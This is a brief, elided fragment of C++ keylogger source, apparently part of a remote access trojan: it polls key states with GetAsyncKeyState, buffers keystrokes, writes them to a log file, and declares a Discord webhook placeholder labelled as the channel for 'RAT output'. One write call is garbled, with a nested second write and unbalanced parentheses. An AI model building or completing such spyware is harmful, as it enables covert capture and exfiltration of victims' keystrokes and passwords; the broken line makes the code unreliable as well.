...
const char* DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_GOES_HERE"; // NEW: Webhook for RAT output
            ...
            if (GetAsyncKeyState(i) & 0x8000) {
                ...
                if (buffer.size() >= MAX_BUFFER_SIZE || key_str.find("[ENTER]") != std::string::npos) {
                    if (!buffer.empty()) {
                         ...
                         logFile.write(data_to_write.data(), dataFile.write(data_to_write.data(), data_to_write.size());
                         logFile.flush();
                         buffer.clear();
                    }
                }
